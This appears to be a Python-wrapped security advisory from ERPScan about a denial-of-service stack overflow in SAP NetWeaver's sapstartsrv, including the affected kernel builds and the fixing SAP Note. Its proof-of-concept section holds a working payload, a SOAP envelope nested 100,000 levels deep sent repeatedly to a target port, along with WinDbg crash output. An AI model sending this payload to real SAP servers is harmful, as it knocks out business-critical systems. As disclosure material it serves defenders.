@@ -1,0 +1,261 @@
+'''
+Application:  SAP NetWeaver KERNEL
+
+Versions Affected: SAP NetWeaver KERNEL 7.0-7.5
+
+Vendor URL: http://SAP.com
+
+Bugs: Denial of Service
+
+Sent:   09.03.2016
+
+Reported: 10.03.2016
+
+Vendor response: 10.03.2016
+
+Date of Public Advisory: 12.07.2016
+
+Reference: SAP Security Note  2295238
+
+Author: Dmitry Yudin (ERPScan)
+
+
+
+Description
+
+
+1. ADVISORY INFORMATION
+
+Title: [ERPSCAN-16-030] SAP NetWeaver  – buffer overflow vulnerability
+
+Advisory ID: [ERPSCAN-16-030]
+
+Risk: high
+
+Advisory URL: https://erpscan.com/advisories/erpscan-16-030-sap-netweaver-sapstartsrv-stack-based-buffer-overflow/
+
+Date published: 12.10.2016
+
+Vendors contacted: SAP
+
+
+2. VULNERABILITY INFORMATION
+
+Class: Denial of Service
+
+Impact: DoS
+
+Remotely Exploitable: yes
+
+Locally Exploitable: yes
+
+
+
+CVSS Information
+
+CVSS Base Score v3:  6.5  / 10
+
+CVSS Base Vector:
+
+AV : Attack Vector (Related exploit range) Network (N)
+
+AC : Attack Complexity (Required attack complexity) Low (L)
+
+PR : Privileges Required (Level of privileges needed to exploit) None (N)
+
+UI : User Interaction (Required user participation) None (N)
+
+S : Scope (Change in scope due to impact caused to components beyond
+the vulnerable component) Unchanged (U)
+
+C : Impact to Confidentiality None (N)
+
+I : Impact to Integrity Low (L)
+
+A : Impact to Availability Low (L)
+
+
+
+3. VULNERABILITY DESCRIPTION
+
+This vulnerability allows an attacker to send a special request to the
+SAPSTARTSRV process port and conduct stack buffer overflow (recursion)
+on the SAP server.
+
+
+4. VULNERABLE PACKAGES
+
+SAP KERNEL 7.21 32-BIT 625
+
+SAP KERNEL 7.21 32-BIT UNICODE 625
+
+SAP KERNEL 7.21 64-BIT 625
+
+SAP KERNEL 7.21 64-BIT UNICODE 625
+
+SAP KERNEL 7.21 EXT 32-BIT 625
+
+SAP KERNEL 7.21 EXT 32-BIT UC 625
+
+SAP KERNEL 7.21 EXT 64-BIT 625
+
+SAP KERNEL 7.21 EXT 64-BIT UC 625
+
+SAP KERNEL 7.22 64-BIT 113
+
+SAP KERNEL 7.22 64-BIT UNICODE 113
+
+SAP KERNEL 7.22 EXT 64-BIT 113
+
+SAP KERNEL 7.22 EXT 64-BIT UC 113
+
+SAP KERNEL 7.42 64-BIT 412
+
+SAP KERNEL 7.42 64-BIT UNICODE 412
+
+SAP KERNEL 7.45 64-BIT 113
+
+SAP KERNEL 7.45 64-BIT UNICODE 113
+
+
+5. SOLUTIONS AND WORKAROUNDS
+
+To correct this vulnerability, install SAP Security Note  2295238
+
+
+6. AUTHOR
+
+Dmitry Yudin (ERPScan)
+
+
+7. TECHNICAL DESCRIPTION
+
+7.1. Proof of Concept
+'''
+
+import socket
+PoC = """<?xml version="1.0" encoding="utf-8"?>
+
+<SOAP-ENV:Envelope
+xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xmlns:xs="http://www.w3.org/2001/XMLSchema">
+   <SOAP-ENV:Header>
+       <sapsess:Session
+xlmns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
+> """ + "<a>" * 100000 + "</a>" * 100000 + """        </sapsess:Session>
+   </SOAP-ENV:Header>
+   <SOAP-ENV:Body>
+       <ns1:WW xmlns:ns1="urn:SAPControl">
+           <b></b>
+           <e><e>
+       </ns1:WW>
+   </SOAP-ENV:Body>
+</SOAP-ENV:Envelope>"""
+
+for i in range(1,5):
+   sock = socket.socket()
+   sock.connect(("SAP_IP", SAP_PORT))
+   sock.send(PoC)
+
+'''
+Windbg exceptions
+
+sapstartsrv!soap_getutf8+0xa:
+00000001`4009cd2a e891f9ffff      call    sapstartsrv!soap_get
+(00000001`4009c6c0)
+
+rax=0000000000000000 rbx=000000000bcdcfb0 rcx=000000000bcdcfb0
+rdx=0000000000000061 rsi=0000000000000000 rdi=000000000bcdcfb0
+rip=000000014009cd2a rsp=0000000002b93ff0 rbp=000000000bcdcfb0
+r8=0000000134936c69  r9=0000000000000000 r10=0000000000000000
+r11=000000014061ee28 r12=0000000000000000 r13=000000000000270f
+r14=00000001409f8ba0 r15=0000000000000000
+iopl=0         nv up ei pl nz na po nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+
+
+
+8. REPORT TIMELINE
+
+Sent:  09.03.2016
+
+Reported: 10.03.2016
+
+Vendor response: 10.03.2016
+
+Date of Public Advisory: 12.07.2016
+
+
+
+9. REFERENCES
+
+https://erpscan.com/advisories/erpscan-16-030-sap-netweaver-sapstartsrv-stack-based-buffer-overflow/
+
+
+
+10. ABOUT ERPScan Research
+
+ERPScan research team specializes in vulnerability research and
+analysis of critical enterprise applications. It was acknowledged
+multiple times by the largest software vendors like SAP, Oracle,
+Microsoft, IBM, VMware, HP for discovering more than 400
+vulnerabilities in their solutions (200 of them just in SAP!).
+
+ERPScan researchers are proud of discovering new types of
+vulnerabilities (TOP 10 Web Hacking Techniques 2012) and of the "The
+Best Server-Side Bug" nomination at BlackHat 2013.
+
+ERPScan experts participated as speakers, presenters, and trainers at
+60+ prime international security conferences in 25+ countries across
+the continents ( e.g. BlackHat, RSA, HITB) and conducted private
+trainings for several Fortune 2000 companies.
+
+ERPScan researchers carry out the EAS-SEC project that is focused on
+enterprise application security awareness by issuing annual SAP
+security researches.
+
+ERPScan experts were interviewed in specialized info-sec resources and
+featured in major media worldwide. Among them there are Reuters,
+Yahoo, SC Magazine, The Register, CIO, PC World, DarkReading, Heise,
+Chinabyte, etc.
+
+Our team consists of highly-qualified researchers, specialized in
+various fields of cybersecurity (from web application to ICS/SCADA
+systems), gathering their experience to conduct the best SAP security
+research.
+
+11. ABOUT ERPScan
+
+ERPScan is the most respected and credible Business Application
+Cybersecurity provider. Founded in 2010, the company operates globally
+and enables large Oil and Gas, Financial, Retail and other
+organizations to secure their mission-critical processes. Named as an
+‘Emerging Vendor’ in Security by CRN, listed among “TOP 100 SAP
+Solution providers” and distinguished by 30+ other awards, ERPScan is
+the leading SAP SE partner in discovering and resolving security
+vulnerabilities. ERPScan consultants work with SAP SE in Walldorf to
+assist in improving the security of their latest solutions.
+
+ERPScan’s primary mission is to close the gap between technical and
+business security, and provide solutions for CISO's to evaluate and
+secure SAP and Oracle ERP systems and business-critical applications
+from both cyberattacks and internal fraud. As a rule, our clients are
+large enterprises, Fortune 2000 companies and MSPs, whose requirements
+are to actively monitor and manage security of vast SAP and Oracle
+landscapes on a global scale.
+
+We ‘follow the sun’ and have two hubs, located in Palo Alto and
+Amsterdam, to provide threat intelligence services, continuous support
+and to operate local offices and partner network spanning 20+
+countries around the globe.
+
+
+Adress USA: 228 Hamilton Avenue, Fl. 3, Palo Alto, CA. 94301
+
+Phone: 650.798.5255
+
+Twitter: @erpscan
+
+Scoop-it: Business Application Security
+'''
